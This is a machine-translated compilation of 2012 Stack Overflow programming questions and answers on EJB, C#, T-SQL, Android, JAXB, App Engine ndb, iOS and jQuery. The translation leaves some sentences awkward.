    Me.tpgTaxInvoiceRegister.Controls.Add(Me.lblOwnerName)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.lblReportType)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.ReadOnlyTextBox2)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.ReadOnlyTextBox1)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.grpTaxAddress)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.btnRunReport)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.dtpStartDate)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.lblEndDate)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.lblStartDate)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.dtpEndDate)
    Me.tpgTaxInvoiceRegister.Controls.Add(Me.cboReportType) 
```

修复。

# java - 如何在 JBoss AS7 中获取 EJB 方法的调用远程客户端的地址

> ID：12954870
> 
> 赞同：3
> 
> 时间：2012-10-18T12:38:20.070
> 
> 标签：java, ejb-3.0, jboss7.x

我有一个分布式应用程序，它由一台服务器组成，即运行应用程序前端和后端的 JBoss AS7。运行在网络中其他机器上的多个客户端获取 JBoss 的 JNDI 初始上下文以获取某些对象。每个客户端都是唯一的，需要在不对其进行任何配置的情况下进行识别。我的方法是获取他们的地址并映射与他们相关的数据（东西池，在所有连接的客户端之间均匀映射）。

**如何获取 EJB 方法的调用客户端的 IP 地址？**

我已经找到了描述如何从线程名称中获取信息的“hacks”（例如在 JBoss 4.x 中使用），但它总是返回如下内容：

> EJB 默认 - 7

请参阅[如何在 ejb 调用中获取调用 IP 地址？](https://stackoverflow.com/questions/1014358/how-can-you-get-the-calling-ip-address-on-an-ejb-call)

如果您在某些上下文中提供代码片段或方法调用，您能否添加它的来源？我无法通过搜索*EJB3*、*Remoting3*和类似的东西找到东西

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-06T18:29:41.327

Just an idea,

May be use can expose your ejb through a rest based web service layer. If you do so it is easy to find remote host name and may also use filter servlet to allow or disallow a request.

You can use @EJB to inject your bean into rest class assuming you will use JAX-RS.

# c# - 平均分配资源列表

> ID：12954871
> 
> 赞同：3
> 
> 时间：2012-10-18T12:38:22.050
> 
> 标签：c#, list, distribution, nodes

很难解释我遇到的问题，但让我们试一试:)

我正在开发的小游戏创建了一堆节点，其中充满了两种资源。
每个节点都有一个**`iron`**值和一个**`gold`**值。

我想将这些节点分成两个区域，因此两个区域**的`gold`**. 但是，差异**`iron`**可能不会大于某个数字（让我们选择**`50`**此示例）

顺便说一下，这些`gold/iron`比率几乎是随机的。这是一个例子：

1.  金 75 铁 30

2.  金 35 铁 70

3.  金 65 铁 35

上述情况的解决方法：去`1`，去。`3``area1``2``area2`

我在尝试自动化这个过程时遇到了很多麻烦。我已经尝试遍历节点列表并始终将节点传递到数量较少`iron`但几乎不起作用的区域。
尝试从更丰富的区域重新分配一些节点也被证明是困难的，因为一些节点的`50 iron`.
我不一定需要找到最佳解决方案（差异最小的解决方案`gold`），尽管那将是最佳解决方案。

任何想法或意见表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T13:50:12.527

I've had a bit of a play with this and this is what I've got so far, should give a good starting point. I've randomly generated a list of gold and iron pairs (I've used Point because it was simpler for me to work with but anything would work.)

The idea is to take a group of small value golds and swap them with a single larger value gold from the other list. Which in most cases will talk equivilent amounts of gold, but swap a larger value of iron with a smaller one.

```
 private void button2_Click(object sender, EventArgs e)
    {
        var GoldIron = new List<Point>(
        new Point[]{
        new Point(16,23),new Point(16,28),new Point(19,44),new Point(21,29),
        new Point(23,16),new Point(24,82),new Point(27,85),new Point(31,63),
        new Point(31,78),new Point(32,65),new Point(41,23),new Point(43,79),
        new Point(44,76),new Point(45,23),new Point(47,16),new Point(50,15),
        new Point(50,37),new Point(52,28),new Point(52,58),new Point(52,71),
        new Point(61,39),new Point(61,75),new Point(63,59),new Point(68,25),
        new Point(68,61),new Point(70,24),new Point(71,75),new Point(74,78),
        new Point(77,59),new Point(82,27)}
        );
        listBox1.DataSource = GoldIron;
        //Split into 2 lists based on the gold amount
        var Left = new List<Point>();
        var Right = new List<Point>();
        var SumGold = GoldIron.Sum(P => P.X);
        var SumIron = GoldIron.Sum(P => P.Y);
        label2.Text = SumGold.ToString();
        label1.Text = SumIron.ToString();
        var LeftGold = 0;
        Int32 i = 0;
        while (LeftGold < SumGold / 2)
        {
            LeftGold += GoldIron[i].X;
            Left.Add(GoldIron[i++]);
        }
        while (i < GoldIron.Count)
        {
            Right.Add(GoldIron[i++]);
        }

        Int32 LIndex = 0;
        //Start Algorithm
        Int32 LeftIron = Left.Sum(P => P.Y);
        Int32 RightIron = Right.Sum(P => P.Y);
        while (LeftIron - RightIron > 50 || RightIron - LeftIron > 50)
        {

            if (LeftIron < RightIron)
            {
                List<Point> TempList = Left;
                Left = Right;
                Right = TempList;
                LIndex = 0;
            }
            Int32 SmallestRight = Right[LIndex].X;
            LeftGold = 0;
            i = 0;
            while (LeftGold < SmallestRight)
            {
                LeftGold += Right[i++].X;
            }
            Point Temp = Right[LIndex];
            Right.RemoveAt(LIndex);
            Right.AddRange(Left.Take(i));
            Left.RemoveRange(0, i);
            Left.Add(Temp);
            LIndex += i;
            //Sort
            Left.Sort(CompareGold);
            Right.Sort(CompareGold);
            LeftIron = Left.Sum(P => P.Y);
            RightIron = Right.Sum(P => P.Y);
        }
        listBox2.DataSource = Left;
        SumGold = Left.Sum(P => P.X);
        SumIron = Left.Sum(P => P.Y);
        label4.Text = SumGold.ToString();
        label3.Text = SumIron.ToString();
        listBox3.DataSource = Right;
        SumGold = Right.Sum(P => P.X);
        SumIron = Right.Sum(P => P.Y);
        label6.Text = SumGold.ToString();
        label5.Text = SumIron.ToString();
    } 
```

And the result: ![enter image description here](../Images/e8c40e088a31d5254b5aed123b61f0b7.png)

# c# - T-SQL Select 语句在使用 IN 时返回零行

> ID：12954872
> 
> 赞同：1
> 
> 时间：2012-10-18T12:38:21.987
> 
> 标签：c#, sql-server, tsql

我在 C# 中使用 t-sql 选择查询时遇到了一些问题。查询如下：

```
@"SELECT * FROM 
 (SELECT *, ROW_NUMBER() OVER (ORDER BY id) as row_number
 FROM [mytable]) t0
 WHERE row_number BETWEEN @skip and @take
 AND
 uploadDate IN (@years) 
 AND NOT photoId IN (@shownPhotos) 
 ORDER BY NEWID()";

cmd.Parameters.Add("@skip", SqlDbType.Int).Value = skip;
cmd.Parameters.Add("@take", SqlDbType.Int).Value = take;
cmd.Parameters.Add("@shownPhotos", SqlDbType.VarChar).Value = shownPhotos;
cmd.Parameters.Add("@years", SqlDbType.VarChar).Value = years; 
```

该方法有四个参数：skip count、take count、showedPhotos（逗号分隔的字符串，包含照片 ID）、years（逗号分隔的字符串，包含显示照片的年份）

所以基本上我希望它从我的数据库中返回与逗号分隔字符串中的任何年份相匹配且尚未显示的照片。

问题（我认为）是我的参数是字符串，因此它们被解释为“1234,567,890”和“2011,2012”。在没有 ' 的 SQL 服务器管理工​​具中运行查询时，它工作正常。

有人有解决方法吗？:-)

提前非常感谢！

**更新代码：**

```
// Create datatables
            DataTable yearsTable = new DataTable();
            yearsTable.Columns.Add("YearID", typeof(string));
            yearsTable.Columns.Add("Year", typeof(string));

            foreach(string year in years.Split(','))
                yearsTable.Rows.Add(new object[] { year, year });

            using (var conn = new SqlConnection(GlobalSettings.DbDSN))
            {
                conn.Open();
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText =
                        @"SELECT * FROM 
                          (SELECT *, ROW_NUMBER() OVER (ORDER BY id) as row_number
                          FROM [mytable]) t0
                          WHERE row_number BETWEEN @skip and @take
                          AND
                          uploadedDate IN (@years)                               
                          ORDER BY NEWID()";

                    SqlParameter skipParam = cmd.Parameters.AddWithValue("@skip", skip);
                    skipParam.SqlDbType = SqlDbType.Int;

                    SqlParameter takeParam = cmd.Parameters.AddWithValue("@take", take);
                    takeParam.SqlDbType = SqlDbType.Int;

                    SqlParameter yearsParam = cmd.Parameters.AddWithValue("@years", yearsTable);
                    yearsParam.SqlDbType = SqlDbType.Structured;
                    yearsParam.TypeName = "dbo.MyTableType";

                    var reader = cmd.ExecuteReader();                        
                } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:40:29.460

您对问题的评估是正确的 - @shownphotos 和 @years 将被解释为单个字符串。

表值参数就是答案

[http://msdn.microsoft.com/en-us/library/bb675163.aspx](http://msdn.microsoft.com/en-us/library/bb675163.aspx)

（在参数化 SQL 语句方面做得很好 - 不要试图通过连接字符串中的 SQL 语句来解决这个问题！）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:44:41.450

实际上，您`IN`被解释为“在这组 1 值中”，即您所拥有的与以下内容相同：

```
AND uploadDate = @years
AND NOT photoId = @shownPhotos 
```

`'1234,567,890'`评估为字符串和的常规字符串相等`'2011,2012'`。在 TSQL 级别，一个常见的技巧是编写一个“拆分”UDF，将单个 varchar 分成多个行值。许多图书馆也有这方面的工具。例如，在[“dapper”](http://nuget.org/packages/Dapper)中，我们添加了一个语法技巧来预扩展它们，即

```
int[] years = {2011,2012};
int[] shownPhotos = {1234,567,890};
int skip = 0, take = 10;
var rows = connection.Query<RowType>(
  @"SELECT * FROM 
   (SELECT *, ROW_NUMBER() OVER (ORDER BY id) as row_number
   FROM [mytable]) t0
   WHERE row_number BETWEEN @skip and @take
   AND uploadDate IN @years
   AND NOT photoId IN @shownPhotos
   ORDER BY NEWID()", new {skip,take,years,shownPhotos}).ToList(); 
```

请注意 旁边没有括号`IN`，我们将其解释为库的“自己解决”，然后它会完全按照您的要求进行操作。它实际上将被评估为：

```
 AND uploadDate IN (@years0,@years1)
   AND NOT photoId IN (@shownPhotos0,@shownPhotos1,@shownPhotos2) 
```

哪里`@years0`有价值`2011`，`@years1`有价值`2012`，等等。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-18T12:47:05.593

看起来您正在将整个日期与一组年份进行比较。

为什么不只提取年份并进行比较？

```
@"SELECT * FROM 
(SELECT *, ROW_NUMBER() OVER (ORDER BY id) as row_number
FROM [mytable]) t0
WHERE row_number BETWEEN @skip and @take
AND
DATEPART(yyyy,uploadDate) IN (@years) 
AND NOT photoId IN (@shownPhotos) 
ORDER BY NEWID()"; 
```

在此处阅读有关 DATEPART 的更多信息：http: [//www.w3schools.com/sql/func_datepart.asp](http://www.w3schools.com/sql/func_datepart.asp)

# database - 从另一个 PHPMYADMIN 自动更新表

> ID：12954874
> 
> 赞同：1
> 
> 时间：2012-10-18T12:38:25.860
> 
> 标签：database, datatable, phpmyadmin

我有一个现有的表 Sign-Up ，其中列出了用户并说明他们是否想订阅新闻信函的选项。因此，在时事通讯的列（在表 Sign_Up 中）中，如果已检查，则显示“是”。

我还有一个名为 Subscribers 的第二个表。假设我想添加现有 Sign_Up 记录的所有或特定（列）值，如果数据表明是，他们想要订阅时事通讯。

这样做的目的是让任何对时事通讯说“是”的记录都可以更新并保存到我的订阅者表中。

这可以在 phpMyadmin 中自动完成吗？

触发器可以帮助解决这个问题吗？

# java - 在 jdeveloper 中导入 org.apache.log4j.Logger

> ID：12954875
> 
> 赞同：2
> 
> 时间：2012-10-18T12:38:27.370
> 
> 标签：java, jdeveloper

导入 org.apache.log4j.Logger 时出现“找不到记录器”错误。我正在使用 JDeveloper 10.1。我需要配置 Log4j，如果需要，请告诉我该怎么做。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:47:16.017

您需要将 log4j jar 添加到类路径中。

[http://www.oracledistilled.com/java/adding-java-libraries-to-oracle-jdeveloper-11g-r1/](http://www.oracledistilled.com/java/adding-java-libraries-to-oracle-jdeveloper-11g-r1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:55:59.587

您的错误听起来好像您已经设置了 Log4J，所以是的，您需要配置 Log4J。

使用以下示例配置将*log4j.properties*文件添加到您的类路径：

```
# Set root logger level to INFO and its only appender to ConsoleOut.
log4j.rootLogger=INFO, ConsoleOut

# ConsoleOut is set to be a ConsoleAppender.
log4j.appender.ConsoleOut=org.apache.log4j.ConsoleAppender

# ConsoleOut uses PatternLayout.
log4j.appender.ConsoleOut.layout=org.apache.log4j.PatternLayout
log4j.appender.ConsoleOut.layout.ConversionPattern=%-5p: [%d] %c{1} - %m%n 
```

# asp.net - 阐明 ASP.NET 生命周期事件的顺序

> ID：12954880
> 
> 赞同：4
> 
> 时间：2012-10-18T12:38:37.653
> 
> 标签：asp.net, asp.net-mvc-3, events, authentication, iis-7

我发现了一篇 MSDN 文章，这可能是我所见过的关于[IIS 集成管道的顺序和工作方式](http://msdn.microsoft.com/en-us/library/bb470252%28v=vs.100%29.aspx)最有帮助的文章。但它提出了有关身份验证的有趣问题。

表单身份验证在管道的早期显示为“正在执行”。“执行”处理程序，例如用于 ASP.NET MVC 路由和控制器执行的处理程序，稍后会显示。但是 ASP.NET MVC 的身份验证故事通常是这样的：

```
public ViewResult Login(LoginModel login)
{
    if (ModelState.IsValid)
    {
        if (Membership.ValidateUser(...)){
            FormsAuthentication.SetAuthCookie(...);
        }
    }
    //...
} 
```

上面的代码表明（表单）身份验证发生在“执行”处理程序阶段，而不是更早的“身份验证”IIS 阶段。

有人可以澄清这种表面上的差异吗？

我自己对此的猜测是，如果我没有配置成员资格提供程序，则 IIS“身份验证”阶段将在指示时执行 FormsAuthenticate.Authorize(...)。但是，如果我配置自己的成员资格提供程序，那么 IIS “身份验证”阶段实际上什么都不做 - 并等待“执行”阶段，以便我自己的身份验证代码可以执行。

如果我的猜测是正确的，那么如果我配置了我自己的成员资格提供程序，这意味着“获取状态”IIS 阶段也不会按预期运行：它还不会“看到”会话建立，因为会话不会建立直到我在 MVC 控制器中完成身份验证步骤。或者也许“验证”和“获取状态”相关的应用程序事件将“延迟”并且在我的控制器执行其验证代码*之前*不会被引发？

是的？不？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-15T17:13:26.467

这里发生了两种不同的事情，这是可以理解的混乱。

1.  正如您所了解的，Forms Authentication 模块确实运行得非常早。但是该模块主要是关于查看表单 auth cookie 并确定其真实性，如果它是真实的，那么设置正确的身份主体以供 ASP.NET 使用。
2.  您通常在 MVC 项目中看到的身份验证代码是关于登录用户的，如果凭据正确，它会将表单身份验证的 cookie 设置为稍后处理。

# asp.net - 图像质量损失

> ID：12954883
> 
> 赞同：0
> 
> 时间：2012-10-18T12:38:45.550
> 
> 标签：asp.net, html, css, .net-4.0, .net-3.5

我有一个在 ASP.NET 4.0 上运行的网站。由于某些原因，我不得不将其转换为 ASP.NET 3.5。一切正常，除了我在网站上使用的一些图像现在模糊了。图像比我指定的“height=40px”大一点，但之前它是正确缩小的，现在缩小的版本变得模糊了。唯一的变化是 .NET 框架。有可能因为这个吗？我该如何解决？提前致谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:47:19.717

在此处查看如何在不损失质量的情况下调整图像大小

[http://www.aspdotnet-suresh.com/2011/05/how-to-resize-size-image-without-losing.html](http://www.aspdotnet-suresh.com/2011/05/how-to-resize-size-image-without-losing.html)

# jms - 无法使用独立的 java 客户端以编程方式在 websphere 中创建 jms 队列

> ID：12954888
> 
> 赞同：1
> 
> 时间：2012-10-18T12:38:49.387
> 
> 标签：jms, websphere

我写了一个java客户端来连接websphere中的jms。我能够连接并产生和消费消息。

我面临的问题是当我执行 Session.createQueue() 时，websphere jms 没有创建新队列。

请有人对这个问题有所了解...

提前致谢...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T14:29:50.537

如果您使用 WebSphere MQ 作为 WebSphere Application Server 中的消息传递提供者，则需要首先在 WebSphere MQ QueueManager 上创建队列。这可以通过图形 WMQ 资源管理器或使用“runmqsc”工具通过命令行来完成。

可以通过 WMQ 信息中心找到这些信息 - 建议对“WMQ 库”进行网络搜索以获取最新链接，目前虽然它是[http://www-01.ibm.com/software/integration/wmq/library/索引.html](http://www-01.ibm.com/software/integration/wmq/library/index.html)

主题虽然不需要预先创建 - 尽管如果需要也可以。可以将各种属性设置为与默认值不同。

如果队列不需要是永久的，例如作为临时回复，则考虑从 JMS 连接创建一个临时队列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T19:24:04.777

createQueue 不会创建新队列。它只是根据供应商特定的标识符创建一个 javax.jms.Queue 对象。javax.jms.Queue 对象只是对现有队列的引用。通常，您从 JNDI 检索 javax.jms.Queue 对象；createQueue 仅在无法或不希望使用 JNDI 的情况下有用。

注意：有一个例外，即支持自动创建队列的 JMS 提供程序（我认为 ActiveMQ 具有这样的功能）。

# android - android新意图错误

> ID：12954890
> 
> 赞同：1
> 
> 时间：2012-10-18T12:38:56.347
> 
> 标签：android, eclipse, android-intent

我是 android 新手，我尝试在两个活动之间传输数据。Eclipse 告诉我这一行：

```
Intent i = new Intent(this, PostDataActivity.class); 
```

构造函数意图未定义。我能做些什么？

```
@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        btnShowLocation = (Button) findViewById(R.id.ansehen);

        // show location button click event
        btnShowLocation.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                // create class object
                gps = new GpsData(StartActivity.this);

                // check if GPS enabled
                if(gps.canGetLocation()){

                    double latitude = gps.getLatitude();
                    double longitude = gps.getLongitude();
                    String mlat = String.valueOf(latitude);

                    // \n is for new line
                    Intent i = new Intent(this, PostDataActivity.class);
                    i.putExtra("Value1", "This value one for ActivityTwo "); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:44:21.107

您正在尝试从`OnClickListener`. 因此，`this`您传递给构造函数的参数是指侦听器，而不是您的 Activity。

要解决问题，请使用：

```
Intent i = new Intent(YourActivityName.this, PostDataActivity.class); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:42:52.053

采用

```
 Intent i = new Intent(YourActivityName.this, PostDataActivity.class); 
```

# android - Android：以编程方式在 Mapview 上的 TextView

> ID：12954891
> 
> 赞同：-4
> 
> 时间：2012-10-18T12:38:59.983
> 
> 标签：android, android-mapview, android-view

如何以编程方式在 mapview 上用地址膨胀 textview？

注意：我不需要文本视图 onCLick/onTap。我只想在地图加载后立即显示文本视图。

谢谢，索米亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:48:13.357

如果您的目标是将文本绑定到某个地理坐标，那么如果用户滚动地图，文本会随之移动，您将需要创建一个自定义`Overlay`来在所需位置绘制文本。

另一方面，如果您只是想让一些文本在固定位置（例如，右上角）覆盖地图，请将`MapView`a 和 a`TextView`作为 a 的子级`RelativeLayout`。将 放置`TextView`在您想要的位置，并确保它是后面的子项`RelativeLayout`（例如，在 XML 中，它在文件的后面）。`RelativeLayout`支持 Z 轴排序，因此`TextView`将浮动在地图上。

# java - 使用带有 cdata 的 jaxb eclipselink2.2 的意外结果

> ID：12954893
> 
> 赞同：1
> 
> 时间：2012-10-18T12:39:01.677
> 
> 标签：java, jaxb, eclipselink, moxy

```
<ITEM>
     <PRODUCT_NAME>IT'S ALL ABOUT YOU-LG:9&quot;H RUBY GATHERNG VASE,RD ROSE,LIME GRN CARN,PURP STOCK,LAV POMS,ATHOS POM,SEAFOAM STATICE,SALAL</PRODUCT_NAME>
     <PRODUCT_CODE>90949L</PRODUCT_CODE>
     <PRODUCT_TYPE>FPT</PRODUCT_TYPE>
     <PRODUCT_CAT>Floral</PRODUCT_CAT>
     <ALIAS_NAME>IT'S ALL ABOUT YOU(TM) - LARGE</ALIAS_NAME>
     <DELIVERY_DATE>10/11/2012</DELIVERY_DATE>
     <FLEX_DATE></FLEX_DATE>
     <FLEX_TEXT></FLEX_TEXT>
     <QUANTITY>1</QUANTITY>
     <PRICE>69.99</PRICE>
     <CARD_MESSAGE>IT'S ALL ABOUT YOU... 
```

当我不添加`@XmlCDATA`注释时，我只得到一个产品名称元素。但是当我使用 cdata 注释时，我得到了重复。一个带有 cdata 和没有 cdata

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T14:26:16.197

By default a [**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222) implementation will expect annotations to be on the get (or set) methods. If you annotate a field this can cause a property to appear multiple times in the XML representation.

**For More Information**

*   [http://blog.bdoughan.com/search/label/XmlAccessorType](http://blog.bdoughan.com/search/label/XmlAccessorType)
*   [http://blog.bdoughan.com/2010/07/cdata-cdata-run-run-data-run.html](http://blog.bdoughan.com/2010/07/cdata-cdata-run-run-data-run.html)

# google-app-engine - ndb 按 ID 检索实体键，没有父级

> ID：12954899
> 
> 赞同：7
> 
> 时间：2012-10-18T12:39:14.703
> 
> 标签：google-app-engine, app-engine-ndb

我想获得一个知道实体 ID 和祖先的实体密钥。ID 在由祖先定义的实体组中是唯一的。在我看来，使用 ndb 接口是不可能的。据我了解数据存储，这可能是由于此操作需要执行完整索引扫描这一事实引起的。我使用的解决方法是在模型中创建一个计算属性，该属性将包含键的 id 部分。我现在可以进行祖先查询并获取密钥

```
class SomeModel(ndb.Model):
    ID = ndb.ComputedProperty( lambda self: self.key.id() )

    @classmethod
    def id_to_key(cls, identifier, ancestor):
        return cls.query(cls.ID == identifier,
                         ancestor = ancestor.key ).get( keys_only = True) 
```

它似乎有效，但是有没有更好的解决方案来解决这个问题？

**更新** 似乎对于数据存储，自然的解决方案是使用完整路径而不是标识符。一开始我觉得会很累。在阅读了 Dragonx 的答案后，我重新设计了我的应用程序。令我惊讶的是，现在一切看起来都简单多了。其他好处是我的实体将使用更少的空间，并且我不需要额外的索引。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-18T15:02:34.740

我也遇到了这个问题。我认为您确实有解决方案。

更好的解决方案是停止使用 ID 来引用实体，并存储实际密钥或完整路径。

在内部，我使用密钥而不是 ID。

在我的 rest API 上，我曾经`http://url/kind/id`（其中 id 看起来像“123”）来获取一个实体。我对其进行了修改以提供实体的完整祖先路径： `http://url/kind/ancestor-ancestor-id`(789-456-123)，然后我会解析该字符串，生成一个密钥，然后通过密钥获取。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T13:10:38.167

由于您有关于您的祖先的完整信息并且您知道您的 id，您可以直接创建您的密钥并获取实体，如下所示：

```
my_key = ndb.Key(Ancestor, ancestor.key.id(), SomeModel, id)
entity = my_key.get() 
```

这样，您就可以避免`get`在金钱和速度方面进行比操作成本更高的查询。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-11T07:17:53.650

我想对 dargonx 的回答做一点补充。

在我的前端应用程序中，我使用键的字符串表示：

```
str(instance.key()) 
```

当我需要对实例进行一些更改时，即使它是后代，我也只使用其键的字符串表示。例如，我有`key_str`-- 来自请求删除实例的参数'：

```
instance = Kind.get(key_str)
instance.delete() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-10T16:03:31.223

我的解决方案是使用`urlsafe`获取项目而不用担心父 ID：

```
pk = ndb.Key(Product, 1234)
usafe = LocationItem.get_by_id(5678, parent=pk).key.urlsafe()
# now can get by urlsafe
item = ndb.Key(urlsafe=usafe)
print item 
```

# iphone - 将 UITableView 变成 UIImageView

> ID：12954905
> 
> 赞同：1
> 
> 时间：2012-10-18T12:39:44.293
> 
> 标签：iphone, objective-c, ios, uitableview, uiimage

我有一个`UITableView`，我想捕获它的可见部分，并将其放入一个`UIImage`. 有什么办法吗？

**编辑**

下面自答

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T16:30:08.723

感谢您的回复。所有答案都适用于 UIView，但不适用于 UITableView - 至少在表格滚动时不会。滚动时，捕获的图像将显示为黑色或透明。我之前尝试过与以下类似的解决方案。我猜人们认为答案是显而易见的，这就是我被否决的原因——因为我很顽皮地提出了如此明显的问题。

无论如何，真正的解决方案是您必须使用表格的 contentOffset：

```
- (UIImage *) imageWithTableView:(UITableView *)tableView
{
    UIView *renderedView = tableView;
    CGPoint tableContentOffset = tableView.contentOffset;
    UIGraphicsBeginImageContextWithOptions(renderedView.bounds.size, renderedView.opaque, 0.0);
    CGContextRef contextRef = UIGraphicsGetCurrentContext();
    CGContextTranslateCTM(contextRef, 0, -tableContentOffset.y);
    [tableView.layer renderInContext:contextRef];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return image;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:42:42.220

```
UIGraphicsBeginImageContext(someView.bounds.size);
[someView.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

取自[这个问题](https://stackoverflow.com/questions/3051630/save-uiviews-representation-to-file)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:43:19.170

```
- (UIImage *)captureView {

//hide controls if needed
CGRect rect = [yourTableView bounds];

    UIGraphicsBeginImageContext(rect.size);
    CGContextRef context = UIGraphicsGetCurrentContext();
    [yourTableview.layer renderInContext:context];   
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return img;

} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:44:17.703

```
UIGraphicsBeginImageContext(tableView.bounds.size);
[tableView.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *resultingImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

也许这些帖子会有所 [帮助](https://stackoverflow.com/questions/788662/rendering-uiview-with-its-children)

[在 iOS 4 中将 UIView 内容保存为内部图像的实际大小（即放大内容以进行保存）](https://stackoverflow.com/questions/4213529/saving-uiview-contents-in-ios-4-with-real-size-of-the-images-inside-i-e-scale)

[将 UIVIew 渲染到后台线程上的图像的安全方法？](https://stackoverflow.com/questions/6348962/safe-way-to-render-uiview-to-an-image-on-background-thread)

# javascript - jQuery attr 方法可以设置点击处理程序和内部文本

> ID：12954909
> 
> 赞同：8
> 
> 时间：2012-10-18T12:39:50.757
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-dialog

阅读 jQueryUI 对话框代码，我发现 jQuery [.attr()](http://api.jquery.com/attr/)方法有一些未记录的行为：

```
<button id="btn1">1</button>
<button id="btn2">2</button>

$(function() {
    var props = {
        text: 'Click it!',
        click: function () {
            console.log('Clicked btn:', this);
        }
    };

    $('#btn1').attr(props, true);    // Changes #btn1 inner text to 'Click it!' 
                                     // and adds click handler
    $('#btn2').attr(props);          // Leaves #btn2 inner text as it is and fires 
                                     // click function on document ready
}); 
```

*   你能解释一下它是如何工作的吗？为什么要设置`true`为属性值对映射后的第二个参数？
*   我可以在我的项目中安全地使用此功能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:59:31.583

我在这里稍微猜测一下，因为我不熟悉 jQuery 源代码。`jQuery.attr`调用`jQuery.access`，jQuery.access 函数上方的注释如下：

```
// Multifunctional method to get and set values of a collection
// The value/s can optionally be executed if it's a function 
```

经过进一步调查，该`text()`函数还调用`jQuery.access`：

```
 attr: function( name, value ) {
        return jQuery.access( this, jQuery.attr, name, value, arguments.length > 1 );
    },
    .........
    text: function( value ) {
        return jQuery.access( this, function( value ) {
        ......
    }, 
```

您正在使用 attr 设置文本和事件处理程序，这不是 attr 的用途。然而，他们似乎都在使用相同的函数来完成工作，所以使用未记录的参数只是偶然地给你预期的行为。

我认为依靠未记录的行为来完成您在此处尝试执行的操作是不可靠的，因为将来对 jQuery 的任何升级都可能破坏您的代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T13:00:40.507

查看 jQuery 1.8.2 代码，`true`参数最终到达变量`pass`中的一行：

```
exec = pass === undefined && jQuery.isFunction( value ); 
```

如果设置，告诉 jQuery 检查检查属于键的值，如果它是一个函数，则立即调用它。因此`click: function(...)`将调用该函数，而不是*注册*该函数。

这似乎是`.method(function() { ... }`各种 jQuery 函数版本的工作方式，即那些不是为属性传递特定值，而是传递一个函数，该函数本身传递原始值，并将其返回值分配给相关属性。

> 我可以在我的项目中安全地使用此功能吗？

我不会，直到它被记录下来。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T13:19:09.273

这是一个有趣的。我不能假装告诉你/为什么/它可以这样工作，我认为甚至可能有理由将此作为错误报告提交给 jQuery，因为他们记录的行为并没有像我预期的那样出现.

在这个页面上，下面的引用出现在底部： [http ://api.jquery.com/attr/](http://api.jquery.com/attr/)

> "注意：如果在 setter 函数中没有返回任何内容（即 function(index, attr){}），或者如果返回 undefined，则当前值不会更改。这对于仅在满足某些条件时选择性地设置值很有用。”

这导致我在 jsFiddle 上玩了一些：http: [//jsfiddle.net/mori57/GvLcE/](http://jsfiddle.net/mori57/GvLcE/)

请注意，与他们的文档相反，案例 8 和 9 返回 null 或不返回任何内容。看看 Alnitak 提到的内容，这似乎是有道理的，因为他们的测试/实际上/只是验证它/是一个函数/而不是该函数返回的内容（.isFunction 应该只返回真/假，这与说返回的值是真/假）。

然而，最后，我同意 Alnitak 和 bcoughlan 的观点，即这不是你应该依赖的功能，尽管我要补充一点，除了它不稳定之外，因为它可能会在未来的 jQuery 版本中发生变化，它依赖于未记录功能的黑客也是一种不好的做法，因为您今天编写的代码的未来开发人员（包括您，在 2-4 个月内！）很容易忘记它的存在，或者为什么它是这样设置的. 最好是明确的，并使用文档中的功能，以便您自己和其他人清楚您的代码打算做什么。

# c++ - C++ 读取 char* 中的注册表字符串值

> ID：12954927
> 
> 赞同：2
> 
